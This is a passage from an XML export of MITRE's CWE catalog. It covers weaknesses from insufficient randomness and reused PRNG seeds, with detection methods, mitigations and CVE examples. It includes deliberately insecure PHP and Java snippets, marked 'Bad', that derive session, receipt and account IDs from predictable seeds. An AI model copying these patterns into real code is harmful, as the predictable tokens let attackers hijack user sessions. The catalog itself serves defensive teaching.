               <Note>If product relies on unique, unguessable IDs to identify a resource, an attacker might be able to guess an ID for a resource that is owned by another user. The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>When an authorization or authentication mechanism relies on random values to restrict access to restricted functionality, such as a session ID or a seed for generating a cryptographic key, then an attacker may access the restricted functionality by guessing the ID or key.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-11.4">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and look for library functions that indicate when randomness is being used. Run the process multiple times to see if the seed changes. Look for accesses of devices or equivalent resources that are commonly used for strong (or weak) randomness, such as /dev/urandom on Linux. Look for library or system calls that access predictable information such as process IDs and system time.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use a well-vetted algorithm that is currently considered to be strong by experts in the field, and select well-tested implementations with adequate length seeds.</xhtml:p>
                  <xhtml:p>In general, if a pseudo-random number generator is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts.</xhtml:p>
                  <xhtml:p>Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 256-bit seed is a good starting point for producing a "random enough" number.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Consider a PRNG that re-seeds itself as needed from high quality pseudo-random output sources, such as hardware devices.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-2">
               <Phase>Architecture and Design</Phase>
               <Phase>Requirements</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-45">
               <Intro_Text>This code attempts to generate a unique random identifier for a user's session.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function generateSessionID($userID){<xhtml:div style="margin-left:1em;">srand($userID);<xhtml:br/>return rand();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.</Body_Text>
               <Body_Text>This example also exhibits a Small Seed Space (CWE-339).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-46">
               <Intro_Text>The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String GenerateReceiptURL(String baseUrl) {<xhtml:div style="margin-left:1em;">Random ranGen = new Random();<xhtml:br/>ranGen.setSeed((new Date()).getTime());<xhtml:br/>return(baseUrl + ranGen.nextInt(400000000) + ".html");</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code uses the Random.nextInt() function to generate "unique" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
		   <Observed_Example>
			 <Reference>CVE-2021-3692</Reference>
			 <Description>PHP framework uses mt_rand() function (Marsenne Twister) when generating tokens</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2021-3692</Link>
		   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-7010</Reference>
               <Description>Cloud application on Kubernetes generates passwords using a weak random number generator based on deployment time.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-7010</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3278</Reference>
               <Description>Crypto product uses rand() library function to generate a recovery key, making it easier to conduct brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3278</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3238</Reference>
               <Description>Random number generator can repeatedly generate the same value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3238</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2367</Reference>
               <Description>Web application generates predictable session IDs, allowing session hijacking.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2367</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2158</Reference>
               <Description>Password recovery utility generates a relatively small number of random passwords, simplifying brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2158</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0255</Reference>
               <Description>Cryptographic key created with a seed based on the system time.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0255</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5162</Reference>
               <Description>Kernel function does not have a good entropy source just after boot.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5162</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4905</Reference>
               <Description>Blogging software uses a hard-coded salt when calculating a password hash.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4905</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4929</Reference>
               <Description>Bulletin board application uses insufficiently random names for uploaded files, allowing other users to access private files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4929</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3612</Reference>
               <Description>Handheld device uses predictable TCP sequence numbers, allowing spoofing or hijacking of TCP connections.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3612</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2433</Reference>
               <Description>Web management console generates session IDs based on the login time, making it easier to conduct session hijacking.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2433</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0166</Reference>
               <Description>SSL library uses a weak random number generator that only generates 65,536 unique keys.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0166</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2108</Reference>
               <Description>Chain: insufficient precision causes extra zero bits to be assigned, reducing entropy for an API function that generates random numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2108</Link>
            </Observed_Example>
	   <Observed_Example>
	     <Reference>CVE-2008-2108</Reference>
	     <Description>Chain: insufficient precision (CWE-1339) in
	     random-number generator causes some zero bits to be reliably
	     generated, reducing the amount of entropy (CWE-331)</Description>
	     <Link>https://www.cve.org/CVERecord?id=CVE-2008-2108</Link>
	   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2020</Reference>
               <Description>CAPTCHA implementation does not produce enough different images, allowing bypass using a database of all possible checksums.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2020</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0087</Reference>
               <Description>DNS client uses predictable DNS transaction IDs, allowing DNS spoofing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0087</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0141</Reference>
               <Description>Application generates passwords that are based on the time of day.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0141</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Cryptography</Functional_Area>
            <Functional_Area>Authentication</Functional_Area>
            <Functional_Area>Session Management</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Randomness and Predictability</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Insecure Randomness</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>CON33-C</Entry_ID>
               <Entry_Name>Avoid race conditions when using library functions</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC30-C</Entry_ID>
               <Entry_Name>Do not use the rand() function for generating pseudorandom numbers</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC32-C</Entry_ID>
               <Entry_Name>Properly seed pseudorandom number generators</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>11</Entry_ID>
               <Entry_Name>Brute Force</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>18</Entry_ID>
               <Entry_Name>Credential/Session Prediction</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="112"/>
            <Related_Attack_Pattern CAPEC_ID="485"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-267"/>
            <Reference External_Reference_ID="REF-207"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Using Poor Random Numbers&#34; Page 259"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 20: Weak Random Numbers.&#34; Page 299"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">This can be primary to many other weaknesses such as cryptographic errors, authentication errors, symlink following, information leaks, and others.</Note>
			<Note Type="Maintenance">
			  As of CWE 4.3, CWE-330 and its descendants are being
			  investigated by the CWE crypto team to identify gaps
			  related to randomness and unpredictability, as well as
			  the relationships between randomness and cryptographic
			  primitives.  This "subtree analysis" might
			  result in the addition or deprecation of existing
			  entries; the reorganization of relationships in some
			  views, e.g. the research view (CWE-1000); more consistent
			  use of terminology; and/or significant modifications to
			  related entries.
			</Note>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
	   communities, "randomness" is used heavily. However, within
	   cryptography, "entropy" is distinct, typically implied as a
	   measurement. There are no commonly-used definitions, even within
	   standards documents and cryptography papers. Future versions of
	   CWE will attempt to define these terms and, if necessary,
	   distinguish between them in ways that are appropriate for
	   different communities but do not reduce the usability of CWE for
	   mapping, understanding, or other scenarios.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Likelihood_of_Exploit, Other_Notes, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Observed_Examples, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Functional_Areas, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Randomness and Predictability</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="336" Name="Same Seed in Pseudo-Random Number Generator (PRNG)" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>A Pseudo-Random Number Generator (PRNG) uses the same seed each time the product is initialized.</Description>
         <Extended_Description>Given the deterministic nature of PRNGs, using the same seed for each initialization will lead to the same output in the same order. If an attacker can guess (or knows) the seed, then the attacker may be able to determine the random numbers that will be produced from the PRNG.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="335" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>

            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Scope>Access Control</Scope>
               <Impact>Other</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not reuse PRNG seeds. Consider a PRNG that periodically re-seeds itself as needed from a high quality pseudo-random output, such as hardware devices.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-2">
               <Phase>Architecture and Design</Phase>
               <Phase>Requirements</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems, or use the more recent FIPS 140-3 [REF-1192] if possible.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-177">
               <Intro_Text>The following code uses a statistical PRNG to generate account IDs.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>private static final long SEED = 1234567890;<xhtml:br/>public int generateAccountID() {<xhtml:div style="margin-left:1em;">Random random = new Random(SEED);<xhtml:br/>return random.nextInt();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program uses the same seed value for every invocation of the PRNG, its values are predictable, making the system vulnerable to attack.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-45">
               <Intro_Text>This code attempts to generate a unique random identifier for a user's session.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function generateSessionID($userID){<xhtml:div style="margin-left:1em;">srand($userID);<xhtml:br/>return rand();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.</Body_Text>
               <Body_Text>If the user IDs are generated sequentially, or otherwise restricted to a narrow range of values, then this example also exhibits a Small Seed Space (CWE-339).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
		 <Observed_Examples>
		   <Observed_Example>
			 <Reference>CVE-2022-39218</Reference>
			 <Description>SDK for JavaScript app builder for serverless code uses the same fixed seed for a PRNG, allowing cryptography bypass</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2022-39218</Link>
		   </Observed_Example>
		 </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Same Seed in PRNG</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-267" Section="Annex C, Approved Random Number Generators"/>
            <Reference External_Reference_ID="REF-1192"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.5, terminology related to randomness, entropy, and
	   predictability can vary widely. Within the developer and other
